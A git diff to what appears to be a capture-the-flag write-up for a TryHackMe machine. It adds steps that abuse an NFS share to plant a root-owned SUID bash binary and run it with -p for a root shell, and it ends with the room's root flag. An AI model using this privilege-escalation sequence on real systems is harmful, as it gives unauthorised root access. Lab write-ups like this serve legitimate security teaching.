@@ -355,8 +355,31 @@ $ ssh -i id_rsa james@10.10.30.248
 # Set SUID permissions
 [attacking@machine]$ chmod +s bash
 # Navigate to the exported directory on the victim machine
-[attacking@machine]$ cd /home/james
+[victim@machine]$ cd /home/james
 # Execute the bash executable with permission of the owner
-[attacking@machine]$ ./bash -p
+[victim@machine]$ ./bash -p
 # -p    run file as the effective user (i.e. root)
 {% endhighlight %}
+
+This solution was giving me issues however because I was using a Linux virtual machine on a M1 Mac; this meant that my `/bin/bash` executable was compiled to a different machine language than what the system on the victim machine could understand. So, instead of working with a bash executable originating from my machine, I used the bash executable originating from the victim machine:
+
+{% highlight shell %}
+# Located the bash executable on the victim machine
+[victim@machine]$ which bash
+# Copied the bash executable to the exported nfs directory
+[victim@machine]$ cp /usr/bin/bash .
+# Changed the ownership on the attacking machine of the bash executable to root
+[attacking@machine]$ chown root:root bash
+# Set the SUID permissions for the bash executable
+[attacking@machine]$ chmod +s bash
+# Executable the bash executable as the effective (root) user
+[victim@machine]$ ./bash -p
+{% endhighlight %}
+
+I finally obtained root!
+
+![Optaining root](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-24 at 06.48.16.png)
+
+I navigated to the `/root` directory and found the root flag.
+
+{% include answer.html answer="thm{a4f6adb70371a4bceb32988417456c44}" %}
